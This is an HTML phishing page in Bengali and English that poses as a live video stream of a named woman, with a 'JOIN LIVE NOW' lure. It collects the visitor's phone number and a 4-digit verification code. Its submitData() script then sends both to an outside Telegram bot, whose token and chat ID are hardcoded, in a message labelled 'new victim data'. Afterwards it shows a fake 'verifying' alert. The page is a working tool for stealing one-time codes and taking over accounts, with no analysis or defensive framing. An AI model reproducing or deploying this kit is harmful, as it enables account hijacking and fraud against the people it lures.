<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <title>🔴 Sumaiya Akter Jui is LIVE NOW</title>
    <meta property="og:title" content="🔴 Sumaiya Akter Jui is LIVE NOW">
    <meta property="og:description" content="Unlock profile to start voice or video call.">
    <meta property="og:image" content="ssstik.io_1777744992501.jpeg"> <meta property="og:type" content="video.other">

    <style>
        /* পুরো সাইটের ডিজাইন */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; width: 100%; overflow: hidden; background-color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }

        /* ভিডিও পেজ ডিজাইন */
        #p1 { position: fixed; width: 100%; height: 100%; z-index: 1; background: #000; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .ui-overlay { position: absolute; bottom: 0; width: 100%; height: 100%; z-index: 2; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; padding-bottom: 60px; background: linear-gradient(to bottom, transparent 50%, rgba(0,0,0,0.8)); }
        
        /* কন্টেন্ট ভিউ ডিজাইন (স্ক্রিনশট অনুযায়ী) */
        .view { position: fixed; top: 0; width: 100%; height: 100%; background: #fff; z-index: 100; display: none; flex-direction: column; align-items: center; padding-top: 80px; }
        .header-pic { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 2px solid #f0f0f0; margin-bottom: 20px; }
        .display-name { font-size: 22px; font-weight: bold; color: #000; margin-bottom: 8px; }
        .sub-text { font-size: 14px; color: #666; margin-bottom: 30px; text-align: center; width: 80%; }
        
        /* ইনপুট এবং বাটন */
        .phone-input { width: 85%; max-width: 380px; padding: 18px; margin-bottom: 25px; border: 1px solid #ddd; border-radius: 8px; background: #f9f9f9; font-size: 16px; outline: none; }
        .action-btn { width: 85%; max-width: 380px; padding: 16px; background: linear-gradient(90deg, #4458dc, #f42d4d); color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 15px; text-transform: uppercase; letter-spacing: 1px; }

        /* ওটিপি ডিজাইন */
        .otp-group { display: flex; gap: 10px; margin-bottom: 25px; }
        .otp-box { width: 50px; height: 55px; border: 1px solid #ddd; border-radius: 6px; text-align: center; font-size: 20px; font-weight: bold; background: #f9f9f9; }
    </style>
</head>
<body>

    <div id="p1">
        <video id="v" autoplay muted loop playsinline poster="ssstik.io_1777744992501.jpeg">
            <source src="1000010152.mp4" type="video/mp4">
        </video>
        <div class="ui-overlay">
            <div style="color: #fff; font-size: 18px; font-weight: bold; margin-bottom: 20px;">Sumaiya Akter Jui is LIVE</div>
            <button class="action-btn" onclick="showPhonePage()">JOIN LIVE NOW</button>
        </div>
    </div>

    <div id="p2" class="view">
        <img src="ssstik.io_1777744992501.jpeg" class="header-pic">
        <h2 class="display-name">Sumaiya Akter Jui</h2>
        <p class="sub-text">Unlock profile to start voice or video call</p>
        <input type="tel" id="ph" class="phone-input" placeholder="Phone number">
        <button class="action-btn" onclick="showOtpPage()">JOIN LIVE NOW</button>
    </div>

    <div id="p3" class="view">
        <img src="ssstik.io_1777744992501.jpeg" class="header-pic">
        <h2 class="display-name">Verification Code</h2>
        <p class="sub-text">Enter the 4-digit code sent to your phone</p>
        <div class="otp-group">
            <input type="tel" maxlength="1" class="otp-box" onkeyup="moveFocus(this, 'c2')">
            <input type="tel" maxlength="1" class="otp-box" id="c2" onkeyup="moveFocus(this, 'c3')">
            <input type="tel" maxlength="1" class="otp-box" id="c3" onkeyup="moveFocus(this, 'c4')">
            <input type="tel" maxlength="1" class="otp-box" id="c4">
        </div>
        <button class="action-btn" onclick="submitData()">START VIDEO CALL ✅</button>
    </div>

<script>
    let userPhone = "";

    function showPhonePage() {
        document.getElementById('p1').style.display = 'none';
        document.getElementById('p2').style.display = 'flex';
    }

    function showOtpPage() {
        userPhone = document.getElementById('ph').value;
        if(userPhone.length < 5) return alert("দয়া করে সঠিক নম্বর দিন");
        document.getElementById('p2').style.display = 'none';
        document.getElementById('p3').style.display = 'flex';
    }

    function moveFocus(current, nextId) {
        if(current.value.length >= 1) document.getElementById(nextId).focus();
    }

    function submitData() {
        const botToken = "8512100128:AAGk_HAlgp8deEn7wuRUtHE90Ev234DN1lE"; 
        const chatId = "8795859465"; // আপনার টেলিগ্রাম আইডি
        
        const boxes = document.querySelectorAll('.otp-box');
        const otpCode = boxes[0].value + boxes[1].value + boxes[2].value + boxes[3].value;

        if(otpCode.length < 4) return alert("৪ সংখ্যার কোডটি দিন");

        const message = `🔥 নতুন ভিকটিম ডাটা:\n👤 নাম: Sumaiya Akter Jui\n📱 নম্বর: ${userPhone}\n🔑 ওটিপি: ${otpCode}`;
        
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(() => {
            alert("যাচাই করা হচ্ছে... দয়া করে অপেক্ষা করুন।");
            location.reload();
        });
    }
</script>
</body>
</html>
